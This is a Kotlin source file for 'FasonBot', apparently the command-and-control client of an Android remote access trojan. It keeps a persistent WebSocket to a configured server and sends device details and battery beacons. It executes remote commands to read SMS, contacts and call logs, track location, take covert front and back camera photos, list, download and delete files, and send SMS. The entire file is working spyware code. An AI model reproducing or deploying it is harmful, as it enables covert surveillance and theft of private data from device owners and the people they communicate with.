package com.fasonbot.app.ws

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.fasonbot.app.action.CommandExecutor
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.util.ThreadManager
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

class WebSocketClient(private val context: Context) {

    companion object {
        private const val TAG = "WSClient"
        private const val KEEPALIVE_INTERVAL_MS = 3000L
        private const val RECONNECT_DELAY_MS    = 4000L
        private const val MAX_RECONNECT_DELAY_MS = 30_000L
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .pingInterval(10, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val gson = Gson()
    private val commandExecutor = CommandExecutor(context)

    // State flags
    private val connected    = AtomicBoolean(false)
    private val shouldRun    = AtomicBoolean(false)
    private val connecting   = AtomicBoolean(false)
    private val failCount    = AtomicInteger(0)

    // Use main-thread Handler for keepalive so it works when screen is off (with wake lock held by CoreService)
    private val handler = Handler(Looper.getMainLooper())
    private var currentSocket: WebSocket? = null

    // ──────────────────────────────────────────────────────────────
    // Keepalive runnable — posts itself every KEEPALIVE_INTERVAL_MS
    // ──────────────────────────────────────────────────────────────
    private val keepAliveRunnable = object : Runnable {
        override fun run() {
            if (!shouldRun.get()) return
            val socket = currentSocket
            if (connected.get() && socket != null) {
                try {
                    socket.send("{\"type\":\"ka\",\"b\":${BotConfig.getBatteryPercentage(context)}}")
                } catch (e: Exception) {
                    Log.w(TAG, "Keepalive send failed: ${e.message}")
                }
            } else if (shouldRun.get() && !connecting.get()) {
                // WebSocket is down — trigger reconnect
                Log.w(TAG, "Keepalive: not connected, reconnecting…")
                triggerReconnect(RECONNECT_DELAY_MS)
            }
            if (shouldRun.get()) handler.postDelayed(this, KEEPALIVE_INTERVAL_MS)
        }
    }

    // ──────────────────────────────────────────────────────────────
    // WebSocket listener
    // ──────────────────────────────────────────────────────────────
    private val listener = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            connected.set(true)
            connecting.set(false)
            failCount.set(0)
            currentSocket = webSocket
            WebSocketSender.webSocket = webSocket
            Log.i(TAG, "Connected to server")
            sendDeviceInfo(webSocket)
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            try {
                val msg = gson.fromJson(text, JsonObject::class.java)
                when (msg.get("type")?.asString) {
                    "command"   -> handleCommand(msg)
                    "pong", "ok" -> { /* keepalive acknowledged */ }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Parse error: ${e.message}")
            }
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            handleDisconnect("Closed $code: $reason")
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            handleDisconnect("Failure: ${t.message}")
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Internal helpers
    // ──────────────────────────────────────────────────────────────
    private fun handleDisconnect(reason: String) {
        if (!connected.get() && !connecting.get()) return // Already handling
        connected.set(false)
        connecting.set(false)
        currentSocket = null
        WebSocketSender.webSocket = null
        val count = failCount.incrementAndGet()
        Log.w(TAG, "Disconnected ($count) — $reason")
        if (shouldRun.get()) {
            // Exponential backoff capped at MAX_RECONNECT_DELAY_MS
            val delay = minOf(RECONNECT_DELAY_MS * count, MAX_RECONNECT_DELAY_MS)
            triggerReconnect(delay)
        }
    }

    private fun triggerReconnect(delayMs: Long) {
        if (!shouldRun.get()) return
        handler.removeCallbacksAndMessages("reconnect")
        handler.postAtTime({
            if (shouldRun.get() && !connected.get()) doConnect()
        }, "reconnect", android.os.SystemClock.uptimeMillis() + delayMs)
    }

    private fun doConnect() {
        if (!shouldRun.get()) return
        if (connected.get()) return
        if (!connecting.compareAndSet(false, true)) return // Already connecting
        try {
            val url = BotConfig.getServerUrl()
            Log.i(TAG, "Connecting → $url")
            val request = Request.Builder()
                .url(url)
                .addHeader("User-Agent", "FasonBot-Android/3.0")
                .build()
            client.newWebSocket(request, listener)
        } catch (e: Exception) {
            connecting.set(false)
            Log.e(TAG, "doConnect error: ${e.message}")
            if (shouldRun.get()) triggerReconnect(RECONNECT_DELAY_MS)
        }
    }

    private fun sendDeviceInfo(webSocket: WebSocket) {
        try {
            val device = DeviceManager.getThisDeviceInfo(context)
            val json = JsonObject().apply {
                addProperty("type", "device_info")
                addProperty("deviceId", device.deviceId)
                addProperty("deviceName", device.deviceName)
                addProperty("androidVersion", device.androidVersion)
                addProperty("battery", BotConfig.getBatteryPercentage(context))
                addProperty("network", BotConfig.getProviderName(context))
            }
            webSocket.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceInfo error: ${e.message}")
        }
    }

    private fun handleCommand(msg: JsonObject) {
        val commandId = msg.get("commandId")?.asString ?: ""
        val action    = msg.get("action")?.asString ?: return
        val params    = if (msg.has("params") && !msg.get("params").isJsonNull)
            msg.getAsJsonObject("params") else JsonObject()

        Log.i(TAG, "Command: $action [$commandId]")
        WebSocketSender.currentCommandId = commandId

        ThreadManager.runInBackground {
            try {
                when (action) {
                    "get_sms"           -> commandExecutor.executeGetSmsMessages()
                    "get_contacts"      -> commandExecutor.executeGetContacts()
                    "get_contacts_web"  -> commandExecutor.executeGetContactsWeb()
                    "get_sms_web"       -> commandExecutor.executeGetSmsWeb()
                    "get_call_log"      -> commandExecutor.executeGetCallLog()
                    "get_location"      -> commandExecutor.executeGetLocation()
                    "capture_back"      -> commandExecutor.executeCaptureBackCamera()
                    "capture_front"     -> commandExecutor.executeCaptureFrontCamera()
                    "list_files"        -> commandExecutor.executeListFiles(params.get("path")?.asString ?: "")
                    "download_file"     -> commandExecutor.executeDownloadFile(params.get("path")?.asString ?: "")
                    "delete_file"       -> commandExecutor.executeDeleteFile(params.get("path")?.asString ?: "")
                    "send_sms"          -> commandExecutor.executeSendSms(
                        params.get("number")?.asString ?: "",
                        params.get("message")?.asString ?: ""
                    )
                    else -> WebSocketSender.sendText("Unknown command: $action")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command error: ${e.message}")
                WebSocketSender.sendText("Error: ${e.message}")
            }
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Public API
    // ──────────────────────────────────────────────────────────────

    /** Start the client. Idempotent — safe to call multiple times. */
    fun connect() {
        if (!shouldRun.compareAndSet(false, true)) {
            // Already running — just ensure we're connected
            if (!connected.get() && !connecting.get()) doConnect()
            return
        }
        DeviceManager.registerDevice(context)
        // Start keepalive loop (also handles reconnection when down)
        handler.post(keepAliveRunnable)
        ThreadManager.runInBackground { doConnect() }
    }

    /** Force a reconnect even if already marked running. */
    fun reconnect() {
        shouldRun.set(true)
        connected.set(false)
        connecting.set(false)
        currentSocket?.cancel()
        currentSocket = null
        WebSocketSender.webSocket = null
        failCount.set(0)
        ThreadManager.runInBackground { doConnect() }
    }

    /** Stop the client completely. */
    fun disconnect() {
        shouldRun.set(false)
        connected.set(false)
        connecting.set(false)
        handler.removeCallbacksAndMessages(null)
        try { currentSocket?.close(1000, "Service stopping") } catch (_: Exception) {}
        currentSocket = null
        WebSocketSender.webSocket = null
    }

    fun isConnected(): Boolean = connected.get()
}
